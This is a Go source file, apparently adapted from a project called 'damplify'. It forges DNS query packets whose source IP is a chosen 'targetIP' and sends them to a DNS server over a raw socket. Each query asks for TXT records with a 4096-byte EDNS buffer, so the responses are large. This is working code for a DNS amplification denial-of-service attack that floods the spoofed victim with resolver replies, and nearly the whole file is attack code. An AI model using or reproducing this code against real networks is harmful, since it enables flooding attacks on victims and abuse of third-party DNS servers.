package go_net

import (
	"encoding/hex"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"log"
	"net"
	"syscall"
)


// reference https://github.com/Nick-Triller/damplify/blob/HEAD/pkg/attack.go

func DnsQuery(targetIP net.IP, targetPort int, dnsServer net.IP) []byte {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	ipLayer := &layers.IPv4{
		Version:  4,
		TTL:      255,
		SrcIP:    targetIP,
		DstIP:    dnsServer,
		Protocol: layers.IPProtocolUDP,
	}
	udpLayer := &layers.UDP{
		SrcPort: layers.UDPPort(targetPort),
		DstPort: layers.UDPPort(53),
	}
	dnsLayer := &layers.DNS{
		// Header fields
		ID:     42,
		QR:     false, // QR=0 is query
		OpCode: layers.DNSOpCodeQuery,
		RD:     true,
		// Entries
		Questions: []layers.DNSQuestion{
			{
				Name:  []byte("cloudflare.com"),
				Type:  layers.DNSTypeTXT,
				Class: 1,
			},
		},
		Additionals: []layers.DNSResourceRecord{
			{
				Type:  layers.DNSTypeOPT,
				Class: 4096,
			},
		},
	}
	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
	if err != nil {
		log.Fatalf("Failed to set network layer for checksum: %v\n", err)
	}

	err = gopacket.SerializeLayers(buf, opts, ipLayer, udpLayer, dnsLayer)
	if err != nil {
		log.Fatalf("Failed to serialize packet: %v\n", err)
	}
	packetData := buf.Bytes()

	log.Println(hex.Dump(packetData))
	return packetData
}

func OpenSocket() int {
	handle, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatal("Error opening device. ", err)
	}
	return handle
}

func SendPacket(fd int, packet []byte, resolverIP net.IP) {
	targetAddr := Ipv4ToSockAddr(resolverIP)
	err := syscall.Sendto(fd, packet, 0, &targetAddr)
	if err != nil {
		log.Fatal("Error sending packet to network device. ", err)
	}
}

func Ipv4ToSockAddr(ip net.IP) (addr syscall.SockaddrInet4) {
	addr = syscall.SockaddrInet4{Port: 0}
	copy(addr.Addr[:], ip.To4()[0:4])
	return addr
}
